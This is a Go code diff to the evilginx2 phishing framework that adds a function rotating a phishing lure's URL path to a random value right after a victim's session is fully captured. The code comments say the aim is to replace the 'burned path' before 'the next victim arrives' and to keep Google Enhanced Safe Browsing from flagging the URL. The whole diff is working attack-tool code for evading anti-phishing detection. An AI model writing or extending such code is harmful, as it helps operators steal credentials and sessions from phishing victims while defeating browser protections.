@@ -2,11 +2,13 @@ package core
 
 import (
 	"fmt"
+	"math/rand"
 	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 
@@ -1166,4 +1168,30 @@ func (c *Config) DeleteRedirectPage(idx int) error {
 	c.cfg.Set(CFG_REDIRECTS, c.redirectPages)
 	c.cfg.WriteConfig()
 	return nil
+}
+
+// RotateAutolureForSession immediately rotates the autolure that served the
+// given session. Called on full capture so the burned path is replaced before
+// the next victim arrives, limiting Google ESB's ability to flag a persistent URL.
+func (c *Config) RotateAutolureForSession(phishLure *Lure) {
+	if phishLure == nil || !phishLure.AutoRotate {
+		return
+	}
+	now := time.Now().Unix()
+	for i, l := range c.lures {
+		if l.AutoRotate && strings.EqualFold(l.Hostname, phishLure.Hostname) {
+			oldPath := l.Path
+			newPath := "/" + GenRandomString(8)
+			l.Path = newPath
+			if l.RotateInterval > 0 {
+				l.NextRotate = now + l.RotateInterval
+			} else {
+				l.NextRotate = now + 2700 + rand.Int63n(2700)
+			}
+			if err := c.SetLure(i, l); err == nil {
+				log.Info("[autolure] [%s] capture-triggered rotation: %s → %s", l.Phishlet, oldPath, newPath)
+			}
+			return
+		}
+	}
 }
